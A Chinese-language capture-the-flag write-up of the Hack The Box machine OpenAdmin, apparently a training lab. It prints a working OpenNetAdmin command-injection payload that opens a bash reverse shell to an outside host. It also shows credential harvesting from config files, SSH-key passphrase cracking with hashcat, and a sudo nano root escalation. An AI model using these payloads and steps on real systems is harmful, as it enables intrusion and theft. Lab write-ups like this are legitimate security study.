![image-20220406013226415](https://raw.githubusercontent.com/huamang/image/master/image-20220406013226415.png)

# USER

namp扫描端口，开启了22端口ssh和80web服务

![image-20220406013248232](https://raw.githubusercontent.com/huamang/image/master/image-20220406013248232.png)

先看80端口，apache默认页面，进行一波路径扫描

![image-20220406013403142](https://raw.githubusercontent.com/huamang/image/master/image-20220406013403142.png)

扫出了两个这个

![image-20220406020718597](https://raw.githubusercontent.com/huamang/image/master/image-20220406020718597.png)

music路由

![image-20220406020825934](/Users/liucheng/Library/Application%2520Support/typora-user-images/image-20220406020825934.png)

ona路由

![image-20220406021003274](https://raw.githubusercontent.com/huamang/image/master/image-20220406021003274.png)

绑定了一个域名

![image-20220406023321743](https://raw.githubusercontent.com/huamang/image/master/image-20220406023321743.png)

这个ona路由看起来有文章可做

右上角登录，尝试弱口令登录，用admin:admin成功登录进去

![image-20220406021440346](https://raw.githubusercontent.com/huamang/image/master/image-20220406021440346.png)



这个系统叫做opennetadmin，版本是v18.1.1，去网上找一下有没有攻击脚本，发现kali里面就自带了

![image-20220406233826613](https://raw.githubusercontent.com/huamang/image/master/image-20220406233826613.png)

这里直接拿poc打了

```
cp /usr/share/exploitdb/exploits/php/webapps/47691.sh ./
```

但是不知道为什么我执行后报错了，无法执行，不太懂sh脚本语法

![image-20220407010354627](https://raw.githubusercontent.com/huamang/image/master/image-20220407010354627.png)

这里payload简单我就直接curl执行命令了

```
curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.16.5/6688 0>%261'&xajaxargs[]=ping" http://10.10.10.171/ona/
```

## www-data->jimmy

成功弹到shell

![image-20220407010929982](https://raw.githubusercontent.com/huamang/image/master/image-20220407010929982.png)

看看当前目录的文件，有一个config文件吸引了我的注意，cat出来看看，这里包含了一个配置文件

![image-20220407011402691](https://raw.githubusercontent.com/huamang/image/master/image-20220407011402691.png)

跟进去看了一下，好像并没有什么密码的泄露

然后去local目录下看了一下，又找到了一个配置文件，是数据库的配置文件，这里有数据库用户名密码

![image-20220407011826426](https://raw.githubusercontent.com/huamang/image/master/image-20220407011826426.png)

```
'db_type' => 'mysqli',
'db_host' => 'localhost',
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
'db_database' => 'ona_default',
'db_debug' => false,
```

这个密码看起来有点提示的意思，试着直接用这个密码登录，先看一下用户表，查一下/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...（省略）
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

jimmy和joanna有点可疑，试着登录到jimmy，但是报错了

```
www-data@openadmin:/opt/ona/www/local/config$ su jimmy
su jimmy
su: must be run from a terminal
```

这里就需要弹一下shell来，比如可以用python去做

```
python3 -c 'import pty; pty.spawn("/bin/sh")'

su jimmy
```

这里登录不知道为什么会说我密码错误了，那么就直接ssh连接

![image-20220407013004164](https://raw.githubusercontent.com/huamang/image/master/image-20220407013004164.png)

jimmy还拿不到user的权限

![image-20220407013100171](https://raw.githubusercontent.com/huamang/image/master/image-20220407013100171.png)

## jimmy->joanna

查看一下apache的配置文件

```python
ls -l /etc/apache2/sites-available/*
/etc/apache2/sites-available/default-ssl.conf
/etc/apache2/sites-available/internal.conf
/etc/apache2/sites-available/openadmin.conf
```

发现了这个东西

```
cat /etc/apache2/sites-available/internal.conf
```

```
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

发现是joanna用户的，这里在52846端口开启了一个web服务，对应的目录在`/var/www/internal`

在index.php里面有密码哈希

![image-20220407110348785](https://raw.githubusercontent.com/huamang/image/master/image-20220407110348785.png)

```
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
```

成功解密出来，密码是Revealed

![image-20220407110539788](https://raw.githubusercontent.com/huamang/image/master/image-20220407110539788.png)

重新进行ssh连接进行端口转发

```
ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846
```

![image-20220407110921191](https://raw.githubusercontent.com/huamang/image/master/image-20220407110921191.png)

用jimmy:Revealed登录进去，给了一个私钥

![image-20220407111107553](https://raw.githubusercontent.com/huamang/image/master/image-20220407111107553.png)

用hashcat爆破出密码，先把密钥文件转换成john可识别格式

```
/usr/share/john/ssh2john.py enc > enc.john 
```

再用hashcat爆破出密码bloodninjas

![image-20220407121748243](https://raw.githubusercontent.com/huamang/image/master/image-20220407121748243.png)

再用openssl生成id_rsa，然后登录ssh

![image-20220407121610321](https://raw.githubusercontent.com/huamang/image/master/image-20220407121610321.png)

拿到user.txt

![image-20220407123540678](https://raw.githubusercontent.com/huamang/image/master/image-20220407123540678.png)

# ROOT

## joanna->root

这里有一个nano是用root权限使用的

![image-20220407123816355](https://raw.githubusercontent.com/huamang/image/master/image-20220407123816355.png)

可以去这里看https://gtfobins.github.io/gtfobins/nano/#sudo

```
sudo /bin/nano /opt/priv
```

执行ctrl+r后执行ctrl+x

![image-20220407125032145](https://raw.githubusercontent.com/huamang/image/master/image-20220407125032145.png)

执行一个id试试

![image-20220407125206843](https://raw.githubusercontent.com/huamang/image/master/image-20220407125206843.png)

直接执行`cat /root/root.txt`

![image-20220407125316599](https://raw.githubusercontent.com/huamang/image/master/image-20220407125316599.png)